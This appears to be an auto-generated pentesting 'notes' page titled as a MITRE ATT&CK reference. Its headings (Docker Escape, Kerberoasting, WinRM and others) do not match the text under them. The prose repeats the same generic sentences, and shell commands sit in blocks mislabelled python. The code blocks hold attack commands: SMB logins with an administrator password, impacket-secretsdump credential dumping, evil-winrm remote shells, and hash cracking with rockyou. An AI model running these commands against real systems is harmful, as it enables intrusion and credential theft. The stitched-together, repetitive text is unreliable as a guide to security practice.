---
TitleSEO: "MITRE ATT&CK Framework Reference | ZureFX"
TitlePost: "MITRE ATT&CK Framework Reference"
Author: "ZureFX"
Description: "Personal notes on MITRE ATT&CK Framework Reference. Quick reference for pentesting and CTF challenges."
Keywords: "lateral movement, malware, blue team, persistence, windows"
URL: "https://zurefx.github.io/notes/note-mitre-att&ck-framework-reference-684.html"
URL_IMAGES: ""
Date: "2024-08-25"
Tags: "Lateral Movement, Malware, Blue Team, Persistence, Windows"
Section: "notes"
Lang: "en"
main_img: "note-mitre-att&ck-framework-reference-684"
Permalink: "/notes/note-mitre-att&ck-framework-reference-684.html"
BtnLabel: "Read Notes"
Pick: 0
---
## Docker Escape

### enum4linux

The scheduled task ran with elevated privileges and could be abused for escalation. Network traffic analysis revealed unencrypted communications containing user credentials. The database credentials were hardcoded in the application source code. Lateral movement was facilitated by reusing discovered credentials across services. Weak file permissions allowed modification of critical system files.

```python
gobuster dir -u http://10.120.248.86/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.28.250.35 -u administrator -p 'P@ssw0rd!' --shares
```

- `SSRF`
- `Unconstrained Delegation`
- `Open Redirect`
- `john`

The web application was vulnerable to Server-Side Template Injection (SSTI). The web application was vulnerable to Server-Side Template Injection (SSTI). The scheduled task ran with elevated privileges and could be abused for escalation. Initial enumeration revealed several interesting open ports on the target.

## CentOS

### RDP

> **Note:** Docker Escape was identified as the primary attack vector in this scenario.

The web application was vulnerable to Server-Side Template Injection (SSTI). Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation. The target system was identified as running a vulnerable version of the service. The target system was identified as running a vulnerable version of the service.

The kernel version was outdated and vulnerable to a publicly known exploit. The kernel version was outdated and vulnerable to a publicly known exploit. Initial enumeration revealed several interesting open ports on the target.

Unconstrained delegation was enabled on the compromised machine. The target system was identified as running a vulnerable version of the service.

- `impacket`
- `bloodhound`
- `mimikatz`
- `SSTI`
- `NTLM Relay`

## Unquoted Service Path

### Kerberoasting

```bash
gobuster dir -u http://10.17.73.142/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

Weak file permissions allowed modification of critical system files. Command injection was possible through unsanitized user input in the search functionality. Network traffic analysis revealed unencrypted communications containing user credentials. The scheduled task ran with elevated privileges and could be abused for escalation. The kernel version was outdated and vulnerable to a publicly known exploit.

## DNS

### LAPS Abuse

> **Note:** Unquoted Service Path was identified as the primary attack vector in this scenario.

Authentication bypass was achieved through careful manipulation of the login mechanism. Post-exploitation enumeration revealed a path to domain administrator privileges. The scheduled task ran with elevated privileges and could be abused for escalation.

```powershell
gobuster dir -u http://10.32.215.59/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
crackmapexec smb 10.97.21.90 -u administrator -p 'P@ssw0rd!' --shares
```

Lateral movement was facilitated by reusing discovered credentials across services. Post-exploitation enumeration revealed a path to domain administrator privileges. The service account had excessive permissions assigned in Active Directory. The web application was vulnerable to Server-Side Template Injection (SSTI). The backup files contained sensitive information that should not have been accessible.

- `CORS Misconfiguration`
- `msfvenom`
- `lookupsid`
- `IDOR`
- `Unquoted Service Path`
- `Sudo Misconfiguration`

## crackmapexec

### AS-REP Roasting

```python
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt --force
```

```python
impacket-secretsdump administrator:'P@ssw0rd!'@10.30.182.135
impacket-secretsdump administrator:'P@ssw0rd!'@10.40.163.233
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.27.195.66/FUZZ
```

```bash
ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://10.73.163.222/FUZZ
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

## Subdomain Takeover

### WinRM

```powershell
impacket-secretsdump administrator:'P@ssw0rd!'@10.63.110.7
evil-winrm -i 10.43.108.56 -u administrator -p 'P@ssw0rd!'
impacket-secretsdump administrator:'P@ssw0rd!'@10.101.188.59
impacket-secretsdump administrator:'P@ssw0rd!'@10.54.223.200
```

The target system was identified as running a vulnerable version of the service. Unconstrained delegation was enabled on the compromised machine.
